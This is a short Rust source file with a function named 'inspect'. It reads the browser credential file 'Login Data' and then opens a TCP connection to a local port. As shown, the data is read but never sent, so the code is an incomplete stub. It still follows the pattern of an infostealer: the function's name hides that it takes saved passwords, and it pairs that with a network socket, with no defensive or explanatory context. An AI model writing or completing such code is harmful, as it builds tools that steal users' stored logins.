use std::fs;
use tokio::net::TcpStream;

pub async fn inspect() {
    let path = "Login Data";
    if let Ok(data) = fs::read(path) {
        let _ = TcpStream::connect("127.0.0.1:6003").await;
    }
}
